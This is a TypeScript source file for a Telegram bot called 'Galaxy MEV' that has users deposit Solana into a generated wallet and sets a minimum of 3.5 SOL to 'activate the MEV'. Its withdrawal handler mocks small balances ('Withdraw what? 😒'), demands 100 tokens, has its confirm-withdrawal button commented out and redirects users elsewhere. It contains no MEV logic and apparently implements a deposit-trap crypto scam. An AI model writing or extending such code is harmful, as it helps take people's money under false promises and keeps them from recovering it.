import type { ActionFunctionArgs } from "react-router";
import { Markup, Telegraf, session } from "telegraf";
import {  token, welcomeMessage } from "~/lib/constants";
import { botCaller } from "~/trpc/utils";

export const bot = new Telegraf(token);

export function createBotHandler() {
	bot.use(session());
	bot.start(async (ctx) => {
        const trpc = await botCaller(ctx.from);
		const keyboard = Markup.inlineKeyboard([
			[
				{
					text: "Open Galaxy MEV",
					web_app: { url: `https://${process.env.VERCEL_URL}` },
				},
			],
			[
				{
					text: "Deposit",
					callback_data: "deposit",
				},
			],
			[
				{
					text: "Withdrawal",
					callback_data: "withdrawal",
				},
			],
		]);
        const user = await trpc.user.getUser()
		return ctx.reply(welcomeMessage(user.balance), keyboard);
	});

    bot.action("deposit", async (ctx) => {
		const keyboard = Markup.inlineKeyboard([
			[
				{
					text: "Confirm SOL Deposit",
					callback_data: "confirm_deposit",
				},
			],
		]);
        const trpc = await botCaller(ctx.from);
        const user = await trpc.user.getUser()
		await ctx.reply(
			"Here is your generated wallet address:\n\n" +
				`${user.publicKey}\n` +
				"Copy this address and fund it through your preferred wallet\n\n" +
				"Once completed, click the button below to confirm your deposit.",
			keyboard,
		);
	});

    bot.action("confirm_deposit", async (ctx) => {
        const trpc = await botCaller(ctx.from);
        const balance = await trpc.user.getUserSolBalance();
        await ctx.reply(`Your current wallet balance is: ${balance} SOL\n\n`  )
        if (balance < 3.5) {
            return await ctx.reply(
                "Your wallet balance is insufficient. Please ensure you have at least 3.5 SOL to activate the MEV.",
            );
        }
        return await ctx.reply(
            "Your deposit has been confirmed! You can now start using the Galaxy MEV Bot")
    })

		bot.action("withdrawal", async (ctx) => {
			const trpc = await botCaller(ctx.from);
			const solBalance = await trpc.user.getUserSolBalance();
			if (solBalance < 3.4) {
				return await ctx.reply(
					"Withdraw what? 😒",
				);
			}
			const user = await trpc.user.getUser();
			if (user.balance < 100) {
				return await ctx.reply(
					"Your balance is too low to initiate a withdrawal. Please ensure you have at least 100 tokens.",
				);
			}
			// const keyboard = Markup.inlineKeyboard([
			// 	[
			// 		{
			// 			text: "Confirm Withdrawal",
			// 			callback_data: "confirm_withdrawal",
			// 		},
			// 	],
			// ]);

			await ctx.reply(
				`Your current balance is: ${user.balance} tokens\n\n` +
				"To proceed, please visit the Galaxy MEV web app and initiate the withdrawal process there.\n\n" +
					"You will receive the remaining balance in your wallet."
			);
	});

	bot.help(async (ctx) => {
		await ctx.reply(
			"Need help? Contact our support team or visit our documentation.\n\n" +
				"Available commands:\n" +
				"/start - Start using the bot\n" +
				"/withdrawal - Withdraw funds\n" +
				"/deposit - Deposit funds\n"
		);
	});

	return async ({request}: ActionFunctionArgs) => {
		try {
			const body = await request.json();
			await bot.handleUpdate(body);
			return new Response("OK", { status: 200 });
		} catch (error) {
			console.error("Error handling Telegram webhook:", error);
			return new Response("Error processing webhook", { status: 500 });
		}
	};
}
